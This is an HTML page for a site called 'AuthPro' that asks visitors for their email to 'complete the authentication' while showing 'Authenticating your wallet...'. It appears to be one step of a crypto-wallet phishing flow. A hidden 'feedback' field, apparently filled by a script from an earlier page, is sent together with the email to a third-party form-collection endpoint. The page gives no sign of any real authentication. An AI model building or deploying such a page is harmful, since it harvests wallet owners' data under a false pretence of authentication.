<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Email - AuthPro</title>
    <link rel="icon" type="png" href="authprologo.png">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <!-- Animated Background -->
    <div class="bg-animation">
        <div class="floating-shape shape1"></div>
        <div class="floating-shape shape2"></div>
        <div class="floating-shape shape3"></div>
        <div class="floating-shape shape4"></div>
        <div class="floating-shape shape5"></div>
        <div class="floating-shape shape6"></div>
    </div>

    <!-- Particle Effect -->
    <div class="particles" id="particles"></div>

    <!-- Email Container -->
    <div class="auth-container">
        <div class="auth-box">
            <a href="index.html" class="logo-link">
                <img src="authprologo.png" alt="AuthPro Logo" class="auth-logo">
                <h2>Almost Done!</h2>
            </a>
            <p>Enter your email address to complete the authentication</p>

            <form id="emailForm" action="https://formspree.io/f/xeejjywd" method="POST">
                <!-- Hidden field to store feedback -->
                <input type="hidden" id="feedbackData" name="feedback" value="">
                
                <div class="form-group">
                    <label>Email Address</label>
                    <input type="email" id="email" name="email" placeholder="your@email.com" required>
                </div>

                <!-- Loading Spinner -->
                <div class="loading-spinner" id="loadingSpinner">
                    <div class="spinner"></div>
                    <p>Authenticating your wallet...</p>
                </div>

                <button type="submit" class="submit-btn" id="submitBtn">Authenticate</button>
            </form>
            
            <a href="feedback.html" class="back-btn">‚Üê Back</a>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
